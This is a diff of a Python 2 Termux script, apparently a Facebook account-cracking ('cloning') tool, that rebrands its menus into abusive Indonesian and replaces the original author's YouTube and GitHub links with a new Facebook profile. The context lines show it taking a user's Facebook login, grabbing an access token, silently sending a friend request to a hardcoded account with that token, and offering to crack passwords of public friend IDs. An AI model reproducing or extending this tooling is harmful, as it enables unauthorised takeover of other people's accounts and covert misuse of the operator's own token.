@@ -76,11 +76,11 @@ logo = """
 
 \033[1;94m⊱══════════════════⊱═⊰DISCLAIMER⊱═⊰══════════════════⊰
 
-\033[1;91mWARNING :\033[1;93mUSE A FRESH ACCOUNT TO LOGIN, DO NOT USE OLD ACCOUNT LOGIN OTHERWISE YOUR ACCOUNT WILL BE BLOCK
+\033[1;91mWARNING :\033[1;93mGUNAKAN AKUN BARU UNTUK LOGIN BILA TIDAK AKUN KALIAN AKAN DINONAKTIFKAN OLEH SI JUKI
 
-\033[1;91mWIFI OR MOBILE DATA :\033[1;93mDO NOT USE WIFI, ONLY MOBILE DATA USE FOR CLONING 
+\033[1;91mWIFI OR MOBILE DATA :\033[1;93mISI KUOTA DULU SEBELUM MENCRACK 
 
-\033[1;91mID NOT FOUND PROBLEM :\033[1;93mCOPY TO PROFILE PHOTO USERNAME AND THEN PASTE IN TERMUX
+\033[1;91mID NOT FOUND PROBLEM :\033[1;93mBILA ADA MASALAH PADA SCRIPT INI URUS AJA SENDIRI ANJING
 """
 
 def tik():
@@ -158,10 +158,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong password!"
-            os.system('xdg-open https://m.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')
+            os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')
     else:
         print "Wrong username!"
-        os.system('xdg-open https://m.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')
+        os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')
 
 ##### LICENSE #####
 #=================#
@@ -179,9 +179,9 @@ def login():
         time.sleep(0.05)
         print "\033[1;91m>>>\033[1;91m[3]\033[1;93m Download Access token"
 	time.sleep(0.05)
-	print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Subscribe Tech Abm Channel" 
+	print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Jangan Lupa Add Akun Saya" 
 	time.sleep(0.05) 
-	print "\033[1;91m>>>\033[1;91m[5]\033[1;93m See all abm commmand" 
+	print "\033[1;91m>>>\033[1;91m[5]\033[1;93m m.facebook.com/DEVILS69JAVHD" 
 	time.sleep(0.05)
 	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
 	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
@@ -200,10 +200,10 @@ def pilih_login():
 	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
 	        login()
 	elif peak =="4":
-		os.system('xdg-open https://www.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')
+		os.system('xdg-open https://m.facebook.com/DEVILS69JAVHD')
 		login()
 	elif unikers =="5":
-		os.system('xdg-open https://github.com/Tech-abm')
+		os.system('xdg-open https://github.com/aa1878')
 		login()
 	elif unikers =="0":
 		jalan('Token Removed')
@@ -225,8 +225,8 @@ def login1():
                 time.sleep(0.05)
 		print logo
 		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
-		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
-		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mMASUKAN AKUN BARU\x1b[1;96m[✾]' )
+		jalan('\033[1;96m[✾]\x1b[1;91mBILA TIDAK PUNYA BUATLAH ANJING\x1b[1;96m[✾]' )
 		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
@@ -234,7 +234,7 @@ def login1():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
+			print"\n\x1b[1;97mTidak Ada Jaringan Bodoh"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -261,7 +261,7 @@ def login1():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
+				print"\n\x1b[1;97mTidak Ada Jaringan Bodoh"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;97mYour Account is on Checkpoint")
@@ -321,7 +321,7 @@ def menu():
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
+		print"\x1b[1;94mTidak Ada Jaringan Bodoh"
 		keluar()
 	os.system("clear")
 	print logo
@@ -330,7 +330,7 @@ def menu():
 	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
 	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
 	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
-	print "\033[1;32;98m[1] \033[1;96m>> start Cloning "																														
+	print "\033[1;32;98m[1] \033[1;96m>> Mulai Maling "																														
 	print "\033[1;32;98m[0] \033[1;96m>> Log out"
 	pilih()
 
@@ -369,7 +369,7 @@ def super():
 	os.system('clear')
 	print logo
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
-	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack From Public ID") 
+	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Crack Teman Publik") 
 	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
 	pilih_super()
@@ -404,12 +404,12 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
-	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
+	print "\033[1;36;96m[⊱⋕⊰] Total ID : \033[1;92m"+str(len(id))
+	jalan('\033[1;34;96m[⊱⋕⊰] Tunggu Bodoh ')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;94m   ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ❈"
+		print("\r\033[1;32;40m[⊱⋕⊰] Maling\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;94m   ❈     \x1b[1;91mBerhenti Maling Tekan CTRL+Z \033[1;94m  ❈"
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 
 
 	def main(arg):
